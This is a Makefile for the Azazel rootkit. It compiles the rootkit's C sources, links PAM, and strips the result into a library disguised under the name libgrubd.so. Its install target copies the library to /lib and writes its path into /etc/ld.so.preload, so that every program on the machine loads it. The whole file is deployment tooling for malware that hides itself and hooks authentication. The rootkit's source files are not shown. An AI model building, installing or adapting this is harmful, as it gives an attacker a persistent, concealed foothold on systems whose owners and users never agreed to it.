INSTALL=/lib

CFLAGS+= -Wall
LDFLAGS+= -lc -ldl -lutil -lpam

all: libgrubd.so

libgrubd.so: azazel.c xor.c
	$(CC) -fPIC -g -c azazel.c xor.c pam.c
	$(CC) -g -fPIC -shared -Wl,-soname,libgrubd.so pam.o azazel.o xor.o $(LDFLAGS) -o libgrubd.so
	strip libgrubd.so

install: all
	@echo [-] Initiating Installation Directory $(INSTALL)
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@echo [-] Installing azazel
	@install -m 0755 libgrubd.so $(INSTALL)/
	@echo [-] Injecting azazel
	@echo $(INSTALL)/libgrubd.so > /etc/ld.so.preload

clean:
	rm libgrubd.so *.o
